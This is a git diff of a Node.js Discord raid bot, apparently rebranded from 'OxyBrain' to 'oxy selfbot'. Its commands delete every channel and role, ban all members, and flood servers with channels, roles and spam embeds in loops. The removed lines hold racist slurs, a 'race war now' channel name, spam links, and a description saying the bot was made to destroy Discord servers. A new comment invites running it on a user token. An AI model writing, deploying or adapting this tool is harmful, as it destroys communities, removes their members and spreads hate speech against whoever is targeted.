@@ -2,7 +2,7 @@ const Discord = require('discord.js')
 const bot = new Discord.Client();
 
 bot.on('ready', () => {
-    console.log(`${bot.user.tag} se právě spustil, jako OxyBrain!`)
+    console.log(`${bot.user.tag} is online as oxy selfbot!`)
 })
 
 bot.on('message', message => {
@@ -12,28 +12,31 @@ bot.on('message', message => {
          }),
       1
     }
+
     if(message.content === "x.nuke") {
- message.channel.send("Nyní se maže vše")
+ message.channel.send("Nuking")
 	 message.guild.channels.forEach(channel => channel.delete())
 	 message.guild.roles.forEach(roles => roles.delete()) } 
 	  
     if(message.content === 'x.create') {
       setInterval(function() {
-      message.guild.createChannel('Kill niggers', 'text')
-      message.guild.createChannel('YCG ON THE TOP', 'voice')
-      message.guild.createChannel('race war now', 'category')
+      message.guild.createChannel('oxy on the top', 'text')
+      message.guild.createChannel('oxy on the top', 'voice')
+      message.guild.createChannel('oxy on the top', 'category')
     }),
     1
   }
+
   if(message.content === 'x.createroles') {
     setInterval(function() {
         message.guild.createRole({
-           name: "Raided by best discord raidbot OxyBrain",
+           name: "oxy on the top",
            color: 'RANDOM'
         })
       }),
       1
     }
+
   if(message.content === 'x.deleteroles') {
     message.guild.roles.forEach(role => role.delete())
   }
@@ -42,21 +45,23 @@ bot.on('message', message => {
   }
   if(message.content === 'x.banall') {
     message.guild.members.forEach((f) => {
-      message.guild.member(f).ban('he he')
+      message.guild.member(f).ban('oxy on the top')
     })
   }
+
   bot.on('message', message => {
 if(message.content === 'x.spam') {
 	setInterval(function() {
   const spam = new Discord.RichEmbed()
-  .setTitle("JOIN THE CRAIG'S EMPIRE NOW")
-  .addField('JPIN THE https://discord.gg/YcDMa6NYmy NOW ', 'https://yungcraig.tk/ https://terrostic-isis.tk/', true)
+  .setTitle("oxy on the top")
+  .addField('oxy on the top', 'oxy on the top', true)
   .setColor("RANDOM")
   message.channel.send(spam)
   }),
       1
     }
 })
+
   if(message.content === 'x.help') {
   const xhelp = new Discord.RichEmbed()
   .setTitle("ALL COMMANDS")
@@ -70,11 +75,12 @@ if(message.content === 'x.spam') {
   if(message.content === 'x.info') {
   const xinfo = new Discord.RichEmbed()
   .setTitle("Informations")
-  .setDescription("**The bot was created 29.7.2020 by YCG (PolaneSS), for in order to destroy discord servers, invite [here](https://discord.com/api/oauth2/authorize?client_id=756829950379556874&permissions=8&scope=bot) **")
+  .setDescription("**The bot was created 29.7.2020 by YCG, Thanks for using oxy selfbot!**")
   .setFooter("Thank you for using OxyBrain")
   .setColor("RANDOM")
   message.channel.send(xinfo)
   }
 }) 
        
-bot.login('token')
+bot.login('') //here put token (user or bot)
+
